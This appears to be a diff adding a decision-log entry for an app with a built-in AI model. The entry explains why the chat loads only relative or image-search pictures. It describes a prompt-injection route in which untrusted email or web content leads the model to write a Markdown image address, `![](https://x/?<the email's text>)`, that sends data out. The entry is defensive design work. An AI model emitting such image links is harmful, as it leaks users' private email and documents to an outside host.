@@ -1,5 +1,16 @@
 # Decision log
 
+## 2026-11-06 — The assistant's chat loads a picture only from the app or from an image search in that chat
+
+- **Why not every picture.** A reply's Markdown comes from the model, which reads untrusted email and web content; a
+  picture address it is tricked into writing (`![](https://x/?<the email's text>)`) would be fetched by the browser and
+  carry that data out. So the chat never loaded remote pictures and showed their titles instead.
+- **Ruling.** `ChatMarkdown` loads a picture whose address is relative (the app's own: an attached or stored picture)
+  or is among the `image_url`s an `image_search` in the same chat returned (`image_search` is in `SHOWN_RESULTS`, so the
+  chat has its results; `picturesOf`). The model does not choose those addresses, Brave or the provider's search does.
+  Any other picture is a link with its title, and the prompt tells the model which addresses show. Applies to Docs'
+  panel, the inline prompt and Mail's panel (same component).
+
 ## 2026-11-06 — Mail: sending is asynchronous, answers are written in the conversation (docs/specs/mail-api.md, Writing and sending)
 
 - **Send closes the composer at once** (operator ruling). The message is sent in the background while a toast says
